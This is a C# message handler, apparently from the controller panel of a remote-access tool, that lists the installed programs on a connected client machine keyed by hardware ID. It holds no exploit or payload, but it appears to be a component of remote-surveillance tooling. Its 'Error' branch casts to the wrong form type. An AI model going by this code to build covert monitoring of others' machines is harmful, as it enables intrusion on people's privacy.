using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerPrograms
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Error"))
			{
				if (!(a == "List"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				FormPrograms form = (FormPrograms)client.Tag;
				form.Invoke((MethodInvoker)delegate
				{
					form.dataGridView2.Rows.Clear();
					form.materialLabel1.Text = "Succues list Programs";
					int num = 2;
					while (num < objects.Length)
					{
						DataGridViewRow dataGridViewRow = new DataGridViewRow
						{
							Cells = 
							{
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = (string)objects[num++]
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = (string)objects[num++]
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = (string)objects[num++]
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = (string)objects[num++]
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = (string)objects[num++]
								},
								(DataGridViewCell)new DataGridViewTextBoxCell
								{
									Value = (string)objects[num++]
								}
							}
						};
						form.dataGridView2.Rows.Add(dataGridViewRow);
					}
				});
			}
			else if (client.Tag == null)
			{
				client.Disconnect();
			}
			else
			{
				FormNetstat form2 = (FormNetstat)client.Tag;
				form2.Invoke((MethodInvoker)delegate
				{
					form2.materialLabel1.Text = "Error: " + (string)objects[2];
				});
			}
			return;
		}
		FormPrograms form3 = (FormPrograms)Application.OpenForms["Programs:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.Text = "Programs [" + (string)objects[2] + "]";
			form3.client = client;
			form3.materialLabel1.Enabled = true;
			form3.dataGridView2.Enabled = true;
			form3.materialLabel1.Text = "Succues Connect";
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
